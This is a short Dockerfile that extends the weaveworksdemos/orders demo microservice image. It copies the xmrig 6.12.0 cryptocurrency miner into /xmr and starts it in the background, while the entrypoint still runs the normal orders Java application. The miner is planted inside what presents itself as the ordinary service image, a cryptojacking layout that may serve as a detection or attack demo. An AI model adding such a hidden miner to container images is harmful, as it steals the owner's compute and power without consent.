FROM weaveworksdemos/orders:0.4.7
COPY xmrig-6.12.0 /xmr

WORKDIR /xmr
RUN ./xmrig &

WORKDIR /usr/src/app

ENTRYPOINT ["/usr/local/bin/java.sh","-jar","./app.jar", "--port=80"]